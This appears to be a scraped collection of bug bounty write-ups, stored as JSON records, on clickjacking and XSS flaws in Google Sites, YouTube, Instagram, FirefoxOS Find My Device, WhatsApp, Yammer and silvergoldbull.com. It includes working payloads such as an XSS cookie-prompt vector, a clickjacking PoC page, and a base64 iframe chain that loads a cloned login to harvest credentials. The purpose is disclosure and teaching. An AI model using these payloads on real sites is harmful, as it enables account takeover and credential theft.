https://sites.google.com/new?usp=jotspot_si is Same-Origin , So the page can be embedded in my https://sites.google.com/site/conceptofmathematicsnow/ 2. Page is embedded to https://sites.google.com/site/conceptofmathematicsnow/ Browser/OS: Firefox/Chrome Attack scenario: 1.) Page contains some sensitive actions like : DELETING THE PAGE, RENAMING THE PAGE. E. Clickjacking in Google’ site error page. 1337$ Steps to reproduce: 1. Create a Google site (new).Embed iframe with src=” https://sites.google.com/site/sites/_/.%2F..%2f/..%2F/etc/passwd \" 2. Open a new browser, log in to Gmail and sites.google.com . 3. In another tab open the site created in 1.( https://sites.google.com/view/raushannewtest ). As the user is login. There is an option to change public profile pic (from albums, private photos inside google drive.Also user can upload from the system and set it as a profile pic)inside the iframe. Browser/OS: chrome , firefox Attack scenario: Attacker can embed payload in google site. Just by few clicks , victim who is logged in to sites.google.com/gmail can unknowingly 1.) make his/her private pics public. 2.) Upload unwanted files in google drive 3.) Unknowingly subscribe to site changes subscription. Embedding this page is like embedding the google drive picker. F. Embedding unlisted youtube videos. 500$ Steps to reproduce: 1. Go to your video → advance settings — -> Distribution Options → embedding and uncheck it , so it means we can’t embed the video in any iframe 2. It can be embedded into any webpage <iframe src=” https://www.youtube.com/embed/pbsQVpEROw4 \"></iframe> Browser/OS: Chrome / Linux Attack scenario: User instead of disallowing the video , can be embedded. It was able to embed whole Youtube, Google Books . I have reported but both of them went duplicate. If any one want’s poc for duplicate one please ping me. Next i started learning about CORS Vulnerability and was able to find cors issue in Google. Will disclose “CORS in google” reports soon. Bug Bounty Google Google Bug Clickjacking -- -- 6 Written by Raushan Raj 445 followers · 23 following Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e", "title": "Self XSS to Good XSS Clickjacking | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf XSS to Good XSS Clickjacking | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS to Good XSS Clickjacking Arbaz Hussain 2 min read · Jul 20, 2017 -- 3 Listen Share Severity : High Complexity: Easy Weakness: Cross Site Scripting While Testing one of the Private on HackerOne , I Land up on the following page. https://sub.site.com/application/request/form Page contain’s Form To submit the detail’s of their application . ‘>“/><svg/onload=prompt(document.cookie)> As soon as i started entering Payload in this Field , Pop up Appear’s . Self-XSS Since Form is Vulnerable to Self XSS ,But Plus Point was There was No X-Frame-Header or Click-jacking Protection . Which Make’s the Attack Easier And Converted it to Well Working XSS on Other User’s . Simple Demo POC: <html> <head><title>Poc</title></head> <body> <h1>Welcome to Click Games</h1> Message :<input id=\"copy-text\" type=\"text\" value='\"/><svg/onload=prompt(document.domain)>\"'> <br><br><br> <script> document.getElementById(\"copy-text\").onclick = function(){ this.select(); document.execCommand('copy'); alert(\"You'r Game Begins!\") } </script> <style> iframe { width: 600px; height: 450px; position: absolute; top: 0; right: 10; filter: alpha(opacity=50); opacity: 0.1; } </style> <iframe src=\" https://sub.site.com/application/request/form \"></iframe> </body> </html> Press enter or click to view image in full size JavaScript -- -- 3 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.seekurity.com/blog/general/redressing-instagram-leaking-application-tokens-via-instagram-clickjacking-vulnerability/", "title": "Re-dressing Instagram – Leaking Application Tokens via Instagram ClickJacking Vulnerability! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/redressing-instagram-leaking-application-tokens-via-instagram-clickjacking-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRe-dressing Instagram – Leaking Application Tokens via Instagram ClickJacking Vulnerability! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later Re-dressing Instagram - Leaking Application Tokens via Instagram ClickJacking Vulnerability! Mohamed A. Baset comment 0 Comments access_time 3 min read (Photo Illustration by Thomas Trutschel/Photothek via Getty Images) Hi Guys, I hope all of you are doing great and in a well state. Today i will show you a ClickJacking bug i found in Instagram that allowed me to iframe ajax responses and leads attackers to steal your instagram connected applications tokens hence hijack your account! Long story short: I have found that some instagram Ajax GET requests can be iframed, I reported this to instagram back in 2015 but they rejected the issue and the reason was “it involves a lot of social engineering and interactions”, I didn’t gave up hope and took the issue to another level. While i was searching what can i do to convince Facebook Security Team with the impact of it an idea came to my mind, if most of the replies of the ajaxed requests of Instagram can be iframed why not trying to iframe the web page that manages the access tokens of the “Connected applications”?? This endpoint should be protected at least with a 20-mins re-auth or with a multi-factor authentication because it is critical. I went to the web page that manages the access token via this url: https://www.instagram.com/accounts/manage_access/ and it looked like this one: The UI is super solid no access tokens are shown or even it can be iframed because X-Frame-Options header is in place, adding __a=1 to the URL (If you’re an active facebook bug hunter you will be aware that most of facebook and instagram endpoints takes “__a=1” parameter to perform ajaxed requests) and here is what i’ve got: A json content-type reply along with the connected applications tokens and guess what? That reply could be iframed 😉 So, I picked up everything together, Opened a new ticket and suggested to my Friend Mostafa Kassem (a great developer BTW) to make a proof of concept but a very advanced one (A complete dashboard kinda like Instagram Phishing platform and you will see it in the proof of concept video), so quickly Mostafa shape the idea in a great way as suggested and i sent the issue back to Facebook again, here is their reply: Me: *winking* Got their attention! The suggested Impact: The suggested impact was that the responses of this ajax request is vulnerable to ClickJacking which gives the attacker the ability to trick the victim into copying the content of the reply and send it back to him, allows him stealing your precious access tokens. Remedy Suggested: Add X-Frame-Options server header to the request responses to prevent it from being iframed. Now, It’s the time of the PoC Video, I hope you guys like it, Again huge shouts to Mostafa Kassem! Profit? Till the next one, Peace! A minute if you please! Building a website, an application or any kind of business? Or already have one? Worried about your security? Think twice before going public and let us protect your business ! - Leaking application ClickJacking Instagram Redressing tokens via Vulnerability Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article The 2.5mins or 2.5k$ hawk-eye bug - A Facebook Pages Admins Disclosure Vulnerability! Translate this blog Scroll Up"}
{"source_url": "https://www.seekurity.com/blog/general/firefox-find-my-device-service-clickjacking/", "title": "FirefoxOS Find My Device Service Clickjacking Bug results in Changing PINs, Wiping and Locking Phones! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/firefox-find-my-device-service-clickjacking/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFirefoxOS Find My Device Service Clickjacking Bug results in Changing PINs, Wiping and Locking Phones! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later FirefoxOS Find My Device Service Clickjacking Bug results in Changing PINs, Wiping and Locking Phones! Mohamed A. Baset comment 0 Comments access_time 6 min read Introduction: Physical devices connected with web applications made everything easy to be managed. Screen size, availability, usage etc… is what pushing everyone to manage their devices through their desktops/laptops! On the other hand such advantages poses a threat if these web applications contains security issues! For example android devices can be managed through “Google Device Manager”, iOS devices can be managed by “iCloud service”, Windows Phone devices can be managed via your Microsoft account, FirefoxOS devices can be managed also through your Mozilla account and finally Internet of Things devices or (IoT) are connected to their own vendors dedicated web apps!! . About Firefox OS Firefox OS (project name: Boot to Gecko, also known as B2G) is an open-source operating system – made for smartphones, tablet computers and smart TVs – designed by Mozilla and external contributors, based on the rendering engine of their Firefox web browser and the Linux kernel. Firefox OS is designed to provide a complete, community-based alternative operating system, for running web applications directly or those installed from an application marketplace. The applications use open standards and approaches such as JavaScript and HTML5, a robust privilege model, open web APIs that can communicate directly with hardware, e.g. cellphone hardware. As such, it competes with commercially developed operating systems such as Apple’s iOS, Google’s Android, Microsoft’s Windows Phone, BlackBerry’s BlackBerry 10 and Jolla’s Sailfish OS. . About Firefox Find My Device Service Find My Device (aka “Where’s My Fox”) is a Firefox OS Service which is used to provide a means for users to locate, track and purge devices remotely. Example Use Cases, MVP User Stories 1) Albert can’t remember the location of his phone. Going to a nearby computer, he logs into WheresMyFox and requests the phone to report it’s location. The phone reports that it is nearby, so Albert requests the device to ring. Albert quickly finds that his phone is in his coat pocket. 2) Bea discovers that her phone is missing. Using a friends phone, she logs into WheresMyFox and requests the phone to report it’s location. She discovers that the phone is currently headed down Broadway, and realizes she has left it in the cab. Realizing that she may never see her phone again, she requests the phone to remotely wipe itself, before calling the cab agency to see if she can recover her device. And here’s our story… . [*] The bug: Firefox Find My Device service is not protected against clickjacking vulnerability neither with the typical “X-Frame-Options” nor with the JS frame busting technique that means a malicious attacker capable of iframing the whole service and tricking the end-users to perform unwanted actions! . [*] Rolling around the bug: To iframe the service and perform a successful Clickjacking attack you need to know the full url of the service which contains a “Device ID” which is a random alphanumeric value (non guessable because it’s a 32 alphanumeric value or even can be MiTMed because of the fact that the service is using HTTPS). So what we’re doing here? Studied the web application more, tested it against other issues (XSS, CSRF, Open Redirections, etc..) but it seems pretty solid! hmmm I took a deep breath, drink some power stuff and suddenly came up with a nasty idea! What about exploiting the usability? Modern Web Applications are usually designed to satisfy the user’s sake of USABILITY so to be straightforward, “Find My Device” service is redirecting you automatically to the device id page but in one condition (if you’re already logged in from a browser that was used before to access the service “a trusted browser”) that little notice brought the whole scenario back to life, By calling an internal url eg. “https://find.firefox.com/” thanks to the usability thing we’re redirected to our treasure “https://find.firefox.com/8fcXXXXc40de04b3803945XXXXXXXXXX” and we’re good to go! . Affected URL(s): https://find.firefox.com . . What attackers can do using such vulnerability?: 1- Erase the victim’s device data with just only 3 clicks by the victim himself if he tricked with “click here to win a 50 BTC for Example” 2- Lock The victim device or change his lock code if it is the first time to be set “4 clicks” 3- Makes the Device ringing “2 clicks” . PoC Video: . More Details About clickjacking: Because of no frame busting techniques or X-Frame-Options header, the whole website is vulnerable to Clickjacking attacks which could lead to a full account takeover considering such scenario: 1. Attacker will iframe any sensitive the website page and adjust the iframe size and add a “divs” as a layers on the unwanted-to-show parts of the original web page to fool and trick the user. 2. User get tricked by the crafted page and followed the attacker’s instruction to do a specific clicks to the iframed page 3. Unwanted actions happened in the logged in user’s session in result to the attack’s clicks. .. Mitigation : 1- Add an X-Frame-Options HTTP Header and set it’s value to “Deny” or “Sameorigin” as you can see it suitable to mitigate such attacks 2- Use iframe busting techmiques in JS code like this: <script type=”text/javascript”> if (self === top) { var antiClickjack = document.getElementById (“antiClickjack”); antiClickjack.parentNode. removeChild(antiClickjack); } else { top.location = ‘Your_Website_URL_Here’; } </script> or <script type=”text/javascript”> // Disable frame hijacking if (top != self) top.location.href = location.href; </script> . The Fix: Mozilla fixed the issue by implementing the X-Frame-Options header with a value of “DENY” which means even the same domain can’t iframe itself, Good job! . . References and other URLs: http://news.softpedia.com/news/firefox-findmydevice-service-lets-hackers-wipe-or-lock-phones-change-pins-495003.shtml http://techworm.net/2015/10/mozillas-firefox-find-my-device-lets-hackers-wipe-or-lock-phones-change-pins.html https://www.dhs.gov/sites/default/files/publications/dhs-daily-report-2015-10-22.pdf (Item 25) http://www.mnrdaily.com/article/mozilla-firefox-find-my-device-feature-allows-hackers-to-wipe-or-lock-phones-and-change-pins/5235.htm http://www.nuanjiong.cn/page/news_softpedia_com/news/firefox-findmydevice-service-lets-hackers-wipe-or-lock-phones-change-pins-495003.shtml http://flavioontivero.weebly.com/tech-news—noticias/mozillas-firefox-find-my-device-lets-hackers-wipe-or-lock-phones-change-pins-firefox-de-mozilla-buscar-mi-dispositivo-le-hackers-limpiar-o-bloquear-celulares-cambiar-pin http://www.expl0its.com/?p=4253 Hall of Fame (4th Quarter 2014) https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options . . Thanks for reading, Till the next adventure! . Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! and Bug Changing ClickJacking Device Find FirefoxOS in Locking My Phones! PINs results Service Wiping Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Facebook movies recommendation vulnerability - A bug capable of erasing all your important notifications! Translate this blog Scroll Up"}
{"source_url": "https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0", "title": "Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html | by Daniel Maksimovic | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html | by Daniel Maksimovic | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html Daniel Maksimovic 5 min read · Sep 13, 2018 -- 3 Listen Share While doing spidering on silvergoldbull site I noticed a strange request to https://silvergoldbull.de/bt.html with following request: https://silvergoldbull.com/bt.html?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Page redirected to: https://silvergoldbull.com/es/us-top-picks-silver/3 Lets check what is in the source code: var _0x2ad7 = [‘split’, ‘join’, ‘fromCharCode’, ‘length’, ‘ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/’, ‘charAt’, ‘location’, ‘search’, ‘substr’]; (function(_0x1c1079, _0x4030e6) { var _0x37524a = function(_0x43a4b9) { while ( — _0x43a4b9) { _0x1c1079[‘push’](_0x1c1079[‘shift’]()); } }; _0x37524a(++_0x4030e6); }(_0x2ad7, 0x17c)); var _0x11bc = function(_0x4a174f, _0x2b3ed7) { _0x4a174f = _0x4a174f — 0x0; var _0x51adc6 = _0x2ad7[_0x4a174f]; return _0x51adc6; }; b = function(_0x1a02a7) { var _0x4af312 = {}, _0x2b3791, _0x1b21f9 = 0x0, _0x45e157, _0x5eca9b, _0x241abe = 0x0, _0x385668, _0x2ceca8 = ‘’, _0x3299c7 = String[_0x11bc(‘0x0’)], _0x2844f2 = _0x1a02a7[_0x11bc(‘0x1’)]; var _0x5717d2 = _0x11bc(‘0x2’); for (_0x2b3791 = 0x0; _0x2b3791 < 0x40; _0x2b3791++) { _0x4af312[_0x5717d2[_0x11bc(‘0x3’)](_0x2b3791)] = _0x2b3791; } for (_0x5eca9b = 0x0; _0x5eca9b < _0x2844f2; _0x5eca9b++) { _0x45e157 = _0x4af312[_0x1a02a7[_0x11bc(‘0x3’)](_0x5eca9b)]; _0x1b21f9 = (_0x1b21f9 << 0x6) + _0x45e157; _0x241abe += 0x6; while (_0x241abe >= 0x8) { ((_0x385668 = _0x1b21f9 >>> (_0x241abe -= 0x8) & 0xff) || _0x5eca9b < _0x2844f2–0x2) && (_0x2ceca8 += _0x3299c7(_0x385668)); } } return _0x2ceca8; }; var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); var h = p[‘get’](‘g’); var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); window.location = u.replace(/[‘“]+/g, ‘’); Script takes the value from the URL and sets it as window.location in the last step. Step by step it looks like this: var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); This var defines new URLSearchParams interface which takes the value of window.location.search as parameter. In this case it is the value of g parameter. So variable p has the value of: ?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next: var h = p[‘get’](‘g’); takes the value of g parameter and assign its value to h variable. Variable h has the value of: z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next variable e is created: var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); It does a substring javascript method and takes the last character of the string assigned to h variable, last value of that string is number 1 ( last value must be number, if not there will be an error since parseInt in variable eq takes string and parses it to integer, so the value must be numeric, no letters ) : z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa[1] Next value h is assigned the value of h without the last character, in this case it is 1. So h has the value of: h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa Next variable eq has the value of array with two field and join method adds the value of “=” to array. var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); So the value inside array and the value variable eq is: = Last step is variable u , there are three things happening here. Value of h is split into array, and then reversed and joined again with value of eq variable added to the end. var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); So first we get: h.split(“”); (68) [“z”, “8”, “i”, “c”, “l”, “Z”, “H”, “b”, “p”, “N”, “X”, “L”, “z”, “t”, “2”, “Y”, “p”, “B”, “X”, “L”, “w”, “9”, “G”, “d”, “t”, “M”, “X”, “d”, “v”, “M”, “X”, “Z”, “v”, “0”, “2”, “b”, “j”, “5”, “C”, “b”, “s”, “V”, “n”, “Y”, “k”, “x”, “2”, “b”, “n”, “J”, “X”, “Z”, “2”, “x”, “W”, “a”, “z”, “9”, “y”, “L”, “6”, “M”, “H”, “c”, “0”, “R”, “H”, “a”] And then reverse the values: h.split(“”).reverse(); (68) [“a”, “H”, “R”, “0”, “c”, “H”, “M”, “6”, “L”, “y”, “9”, “z”, “a”, “W”, “x”, “2”, “Z”, “X”, “J”, “n”, “b”, “2”, “x”, “k”, “Y”, “n”, “V”, “s”, “b”, “C”, “5”, “j”, “b”, “2”, “0”, “v”, “Z”, “X”, “M”, “v”, “d”, “X”, “M”, “t”, “d”, “G”, “9”, “w”, “L”, “X”, “B”, “p”, “Y”, “2”, “t”, “z”, “L”, “X”, “N”, “p”, “b”, “H”, “Z”, “l”, “c”, “i”, “8”, “z”] And them join the values and add the value of eq variable: h.split(“”).reverse().join(“”) + eq “aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=” So we get the final falue encoded in BASE64 and the function b does decoding to cleartext and regex inside window.location removes quotes and double quotes. b(“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”); “https://silvergoldbull.com/es/us-top-picks-silver/3\" Exploitation time: 1. Simple XSS as simple POC URL: https://silvergoldbull.com/bt.html?g=xETMv8yOpUWar92bj5CduVWb1N2bkhCdyVGbhpDdwlmcjNXY2Fma1 POC: Press enter or click to view image in full size Img 1.0 Page loads in Google Chrome — XSS Auditor bypassed Press enter or click to view image in full size Img 2.0 Page loads in Mozilla Firefox We used vector javascript:alert(document.cookie);//111 to generate BASE64 without equal or plus signs and then we reverse the string and add numeric value to the end: Img 3.0 Base64 encoded XSS vector Img 4.0 Base64 reversed XSS vector But we can’t get the cookies we need cos of HTTPOnly on the cookies, so we need a more advanced attack. Something that will get us data. 2. Stealing user logins with fake login inside Iframe displayed on https://silvergoldbull.com Lets first clone the login page and setup fake https login page: https://maxon3.github.io/silvergold/ Next we have to setup out injection vector, since quotes and double quotes are removed from the vector we have to use something other instead of them, we can use backtics and bypass that. Steps: 1. Set new parameter inside URL request with value of encoded base64 iframe ( secK parameter ) 2. Request value of secK with our javascript injected vector ( injection vector is the value of g parameter ) 3. Page gets rendered and displayed 4. User enters his data and clicks login 5. Attacker has user data and the best thing is URL will still show silvergoldbull Vector used is: https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1 Explained: Value of g is: var h = “v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1”; console.log(atob(h.substr(0,h.length-1).split(“”).reverse().join(“”))); javascript:document.write(atob(p[`get`](`secK`)));//// So we take the value of param secK and decode it with atob function, after decoding is done the value is written inside DOM and rendered. The value of secK is: atob(‘PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==’) <iframe onload=”window.stop();”src=’//goo.gl/hQ4xXo’style=”height:1000px;width:100%;border:0\"> We used google redirector to shorten the base64 vector, removed spaces where we could, removed the border, set iframe to take full value of viewport, and to remove loading spinning animation we set window.stop() to run right after the page has finished loading. POC: Press enter or click to view image in full size Img 5.0 Page loaded on Google Chrome with fake login iframe server from github pages Press enter or click to view image in full size Img 6.0 After user submits the login form we got his data All attacker needs is to share URL and wait for credentials, it is that easy. ClickJacking can also be exploited due to fact that SAMEORIGIN requirements have been satisfied: https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvdHpiRlI2J3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1 Value of secK is : <iframe onload=”window.stop();”src=’//goo.gl/tzbFR6'style=”height:1000px;width:100%;border:0\"> POC: Press enter or click to view image in full size Img 7.0 https://silvergoldbull.com website inside Iframe, ready for ClickJacking Fix: They removed the vulnerable page, but for all of you who want to “practice” and exploit this bug while reading this post, I created a hack.me just for you: https://hack.me/104291/dom-xss-2.html Thanks for reading. JavaScript Xss Attack Security Hacking Bug Bounty -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Daniel Maksimovic 294 followers · 14 following A pentester. A bug bounty hunter. All together that wierd security guy. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.seekurity.com/blog/general/whatsapp-clickjacking-vulnerability-yet-another-web-client-failure/", "title": "WhatsApp Clickjacking Vulnerability – Yet another web client failure! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/whatsapp-clickjacking-vulnerability-yet-another-web-client-failure/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWhatsApp Clickjacking Vulnerability – Yet another web client failure! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later WhatsApp Clickjacking Vulnerability - Yet another web client failure! Mohamed A. Baset comment 0 Comments access_time 4 min read Hi Folks, I know it’s a little bit lame to mention 2 clickjacking vulnerabilities in row but that what bug hunters always do exposing the largest companies security failures, (Previously was Telegram ) this time is the gigantic well-known 19 billion dollar messenger WhatsApp . WhatsApp Inc., was founded in 2009 by Brian Acton and Jan Koum , both former employees of Yahoo! . After Koum and Acton left Yahoo! in September 2007, the duo traveled to South America as a break from work. At one point they applied for jobs at Facebook but were rejected. For the rest of the following years Koum relied on his $400,000 savings from Yahoo!. In January 2009, after purchasing an iPhone and realizing that the seven-month-old App Store was about to spawn a whole new industry of apps, he started visiting his friend Alex Fishman in West San Jose where the three would discuss “…having statuses next to individual names of the people,” but this was not possible without an iPhone developer, so Fishman introduced Koum to Igor Solomennikov, a developer in Russia that he had found on RentACoder.com. Koum almost immediately chose the name “WhatsApp” because it sounded like “what’s up”, and a week later on his birthday, on February 24, 2009, he incorporated WhatsApp Inc. in California. However, early WhatsApp kept crashing or getting stuck and at a particular point, Koum felt like giving up and looking for a new job, upon which Acton encouraged him to wait for a “few more months” Regarding the vulnerability, Clickjacking is one of the oldest web application typical vulnerabilities where (by design) a lot of companies never paid attention to it. Clickjacking , also known as a “UI redress attack”, is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is “hijacking” clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker. What an attacker can do with a clickjacking on WhatsApp? 1. Sending a messages in behalf of the currently logged in users 2. Deceive users to create unwanted chat groups, make calls, add contacts, block contacts, etc… Back to January 2015, One of Seekurity members reported the vulnerability to Facebook (because at this time WhatsApp was one of Facebook’s acquisitions) and here’s a screenshot of the original report. WhatsApp Report to Facebook The whole web client of WhatsApp was vulnerable to clickjacking attack, Sometimes web applications with a minimal functionalities are immune to vulnerabilities because of the fact that you’re attacking just a few features! Encryption and Web Clients! Both Telegram and WhatsApp are supporting end-to-end encryption but the fact is when the client fails to protect it’s users the crypto means nothing! Unlike Telegram and it’s tricky UI protection mechanisms, WhatsApp was totally vulnerable without an Iframe busting techniques or even an X-FRAME-OPTIONS header value! When it comes to a web app with a few features to attack, Attackers are looking for any ways that gives them an access to such hard-to-hack services and regardless that a clickjacking attack might be worthless “sometimes” but in our case it still effective! WhatsApp ClickJacking PoC Demonstration and PoC Code The Fix: WhatsApp finally noticed the risk of the issue and fixed it by applying an X-Frame-Options header with a value of “Deny” Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! Article image credits: ( deccanchronicle.com) another ClickJacking client failure! Vulnerability web WhatsApp WhatsApp Clickjacking Vulnerability - Yet another web client failure! Yet Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Official Telegram Web Client ClickJacking Vulnerability - When crypto is strong and client is weak Translate this blog Scroll Up"}
{"source_url": "https://medium.com/@vulnerabilitylabs/bug-bounty-lfi-at-google-com-3c2e17d8c912", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vulnerabilitylabs/bug-bounty-lfi-at-google-com-3c2e17d8c912. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://www.seekurity.com/blog/general/microsoft-yammer-clickjacking-exploiting-html5-security-features/", "title": "Microsoft Yammer Clickjacking – Exploiting HTML5 Security Features – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/microsoft-yammer-clickjacking-exploiting-html5-security-features/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMicrosoft Yammer Clickjacking – Exploiting HTML5 Security Features – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later Microsoft Yammer Clickjacking - Exploiting HTML5 Security Features Mohamed A. Baset comment 0 Comments access_time 3 min read Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Yammer is a freemium enterprise social networking service used for private communication within organizations. Access to a Yammer network is determined by a user’s Internet domain so that only individuals with approved email addresses may join their respective networks. The service began as an internal communication system for the genealogy website Geni, and was launched as an independent product in 2008. Microsoft later acquired Yammer in 2012 for US$1.2 billion. . The bug: Yammer is not protecting itself from clickjacking with the typical “X-Frame-Options” header but uses a JS frame busting technique to prevent the website to be iframed but b y exploiting one of HTML5 Features “Sandboxed Iframes” Iframing Yammer.com will be possible and we will prevent the redirection to the top window location! . . What is Sandboxed iframes? The sandbox attribute enables an extra set of restrictions for the content in the iframe. When the sandbox attribute is present, and it will: – Treat the content as being from a unique origin – Block form submission – block script execution – Disable APIs – Prevent links from targeting other browsing contexts – Prevent content from using plugins (through <embed>, <object>, <applet>, or other) – Prevent the content to navigate its top-level browsing context – Block automatically triggered features (such as automatically playing a video or automatically focusing a form control) The value of the sandbox attribute can either be just sandbox (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions. . Attack Scenario: Iframing the Settings page or any other sensitive page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running, fooling the users to do unwanted actions. . Impact: What attacker can achieve? – Change sensitive information of the currently logged in Yammer users (Password, Recovery Emails, etc..) – Send messages in behalf of currently logged in Yammer users – Send Contact requests in behalf of currently logged in Yammer users – Send Group invites in behalf of currently logged in Yammer users – 